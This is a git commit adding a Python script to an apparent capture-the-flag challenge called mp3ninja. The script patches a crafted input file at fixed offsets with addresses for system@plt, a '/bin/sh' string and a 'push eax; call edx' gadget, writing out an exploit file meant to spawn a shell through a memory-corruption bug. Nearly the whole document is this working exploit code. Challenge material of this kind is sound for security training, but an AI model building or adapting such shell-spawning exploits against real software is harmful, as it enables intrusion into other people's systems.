7e818cf88390b7d84f4bab887507e49d51ae4dfd
zhenghaohu <huzh@nyu.edu>
2020-01-23 22:20:11 +0000

    chal mp3ninja (kill stack unused bug to save database storage)

---
+++ chal/chal_mp3ninja/patch.py
@@ -0,0 +1,35 @@
+import sys, struct
+
+addr = 0x0806b313
+#addr = 0x0806ffff
+offset = 0xd10
+
+with open(sys.argv[1], 'rb') as fd:
+    data = fd.read()
+
+nd = data[:offset] + struct.pack('<I', addr) + data[offset+4:]
+
+#addr = 0x0806ffff
+addr = 0x08048790    # system.plt
+offset = 0xc5d+0x1c
+nd = nd[:offset] + struct.pack('<I', addr) + nd[offset+4:]
+
+addr = 0x0806d49c    # /bin/sh
+offset = 0xc5d
+nd = nd[:offset] + struct.pack('<I', addr) + nd[offset+4:]
+
+#addr = 0x08048790    # system.plt
+#offset = 0xc5d+0x24
+#nd = nd[:offset] + struct.pack('<I', addr) + nd[offset+4:]
+
+addr = 0x0804894f    # push eax; call edx
+offset = 0xc5d+0x40
+nd = nd[:offset] + struct.pack('<I', addr) + nd[offset+4:]
+
+#system_addr = 0x08048890
+#binsh_addr = 0x0806c6b7
+#offset = 0x323
+#nd = nd[:offset] + struct.pack('<I', system_addr) + 'HHHH' + struct.pack('<I', binsh_addr) + nd[offset+12:]
+
+with open('exp', 'wb') as fd:
+    fd.write(nd)
